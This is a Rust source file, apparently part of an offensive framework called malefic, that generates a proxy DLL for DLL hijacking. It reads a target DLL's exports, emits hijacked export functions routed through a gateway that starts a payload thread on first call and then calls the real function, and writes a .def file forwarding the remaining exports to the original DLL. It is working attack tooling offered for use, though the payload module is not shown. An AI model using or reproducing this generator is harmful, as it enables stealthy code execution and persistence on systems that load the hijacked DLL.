use crate::tool::pe::{ExportInfo, PEParser};
use anyhow::{anyhow, Result};
use std::fs;
use std::path::Path;

/// Update malefic-proxydll project with complete proxy DLL implementation
/// This function generates all necessary code files and configuration
pub fn update_proxydll(
    dll_path: &str,
    hijacked_exports: &[&str],
    use_native_thread: bool,
    _hijack_current_thread: bool,  // Reserved for future use
    _link_runtime: bool,           // Reserved for future use
) -> Result<()> {
    if dll_path.contains(' ') {
        return Err(anyhow!(
            "The DLL path cannot contain spaces. Use DOS short name instead."
        ));
    }

    // Parse DLL exports using PE parser
    let exports = PEParser::parse_dll_exports(dll_path)?;
    if exports.is_empty() {
        return Err(anyhow!("DLL without exports found"));
    }

    let project_root = Path::new("malefic-proxydll");
    if !project_root.exists() {
        return Err(anyhow!(
            "malefic-proxydll project not found. Make sure you're running from project root."
        ));
    }

    // Validate that hijacked exports exist in the DLL
    validate_exports(&exports, hijacked_exports)?;

    // Generate all necessary files
    build_lib(&exports, project_root, dll_path, hijacked_exports, use_native_thread)?;
    build_def(&exports, project_root, dll_path, hijacked_exports)?;
    
    println!("✅ malefic-proxydll project updated successfully");
    println!("📁 Target DLL: {}", dll_path);
    println!("🎯 Hijacked exports: {:?}", hijacked_exports);
    println!("⚙️  Native thread: {}", use_native_thread);
    println!("🛠️  To build: cargo build --release -p malefic-proxydll");
    Ok(())
}

/// Validate that all requested hijacked exports exist in the target DLL
fn validate_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> Result<()> {
    for hijacked in hijacked_exports {
        let found = exports.iter().any(|export| export.name == *hijacked);
        if found {
            println!("[+] Exported function {} found for hijacking", hijacked);
        } else {
            return Err(anyhow!("Hijacked export '{}' not found in target DLL", hijacked));
        }
    }
    Ok(())
}


/// Generate complete lib.rs file with all export functions
fn build_lib(
    exports: &[ExportInfo],
    project_root: &Path,
    dll_path: &str,
    hijacked_exports: &[&str],
    _use_native_thread: bool,
) -> Result<()> {
    let hijacked_functions = build_hijacked_exports(exports, hijacked_exports);
    let forwarded_functions = build_forwarded_exports(exports, hijacked_exports);
    let function_names_array = build_function_names_array(hijacked_exports);
    
    let lib_content = format!(r#"// Auto-generated proxy DLL library
// DO NOT EDIT MANUALLY - Generated by malefic-mutant

mod payload;

use lazy_static::lazy_static;
use std::sync::{{Arc, Mutex}};
use dinvoke_rs::dinvoke::{{load_library_a as load_library, get_function_address as get_address}};

const DLL_NAME: &str = r"{}";
static mut ADDRESS: usize = 0;

lazy_static! {{
    static ref MUTEX: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
}}

// Static array of hijacked function names
const HIJACKED_FUNCTIONS: &[&str] = &[
{}];

/// Core gateway function that handles DLL hijacking logic
pub fn gateway(
    arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64,
    arg6: u64, arg7: u64, arg8: u64, arg9: u64, arg10: u64,
    arg11: u64, arg12: u64, arg13: u64, arg14: u64, arg15: u64,
    arg16: u64, arg17: u64, arg18: u64, arg19: u64, arg20: u64,
    index: u32
) -> u64 {{
    let flag = Arc::clone(&MUTEX);
    let mut flag = flag.lock().unwrap(); 
    if *flag == 0 {{    
        *flag += 1;
        crate::payload::create_payload_thread();
    }}
    
    unsafe {{
        if ADDRESS != 0 {{
            let func: extern "system" fn(u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64 
                = std::mem::transmute(ADDRESS);
            return func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20);
        }}   
    }}

    let func_name = if (index as usize) < HIJACKED_FUNCTIONS.len() {{
        HIJACKED_FUNCTIONS[index as usize]
    }} else {{
        ""
    }};

    if func_name.is_empty() {{ 
        return 0; 
    }}

    let dll_address = load_library(DLL_NAME);
    if dll_address == 0 {{ 
        return 0; 
    }}

    let func_address = get_address(dll_address, func_name);
    if func_address == 0 {{ 
        return 0; 
    }}
    
    unsafe {{
        ADDRESS = func_address;
        let func: extern "system" fn(u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64 
            = std::mem::transmute(ADDRESS);
        func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20)
    }}
}}

// Export functions that call our gateway (hijacked)
{}

// Export functions that are forwarded via .def file (empty stubs)
{}
"#, dll_path, function_names_array, hijacked_functions, forwarded_functions);

    let lib_path = project_root.join("src/lib.rs");
    fs::write(lib_path, lib_content)?;
    println!("📄 Generated lib.rs");
    Ok(())
}


/// Generate static array of hijacked function names
fn build_function_names_array(hijacked_exports: &[&str]) -> String {
    hijacked_exports
        .iter()
        .map(|export| format!("    \"{}\",", export))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Generate hijacked export functions that call gateway
fn build_hijacked_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> String {
    let mut functions = String::new();
    
    for export in exports {
        if hijacked_exports.contains(&export.name.as_str()) {
            let index = hijacked_exports
                .iter()
                .position(|&x| x == export.name)
                .unwrap();
            
            functions.push_str(&format!(r#"
#[no_mangle]
pub extern "C" fn {}(
    arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64,
    arg6: u64, arg7: u64, arg8: u64, arg9: u64, arg10: u64,
    arg11: u64, arg12: u64, arg13: u64, arg14: u64, arg15: u64,
    arg16: u64, arg17: u64, arg18: u64, arg19: u64, arg20: u64
) -> u64 {{
    gateway(
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10,
        arg11, arg12, arg13, arg14, arg15, arg16, arg17, arg18, arg19, arg20,
        {}
    )
}}
"#, export.name, index));
        }
    }
    
    functions
}

/// Generate forwarded export functions (empty stubs)  
fn build_forwarded_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> String {
    let mut functions = String::new();
    
    for export in exports {
        if !hijacked_exports.contains(&export.name.as_str()) {
            functions.push_str(&format!(r#"
#[no_mangle]
pub extern "C" fn {}() {{}}
"#, export.name));
        }
    }
    
    functions
}


/// Generate .def file for proper DLL exports
fn build_def(
    exports: &[ExportInfo],
    project_root: &Path,
    dll_path: &str,
    hijacked_exports: &[&str],
) -> Result<()> {
    let mut def_content = String::from("EXPORTS\n");
    
    for export in exports {
        if hijacked_exports.contains(&export.name.as_str()) {
            // Hijacked function, no forwarding
            def_content.push_str(&format!("{} @{}\n", export.name, export.ordinal));
        } else {
            // Forward to original DLL
            def_content.push_str(&format!("{}={}.{} @{}\n", 
                export.name, dll_path, export.name, export.ordinal));
        }
    }
    
    let def_path = project_root.join("proxy.def");
    fs::write(def_path, def_content)?;
    println!("📄 Generated proxy.def");
    Ok(())
}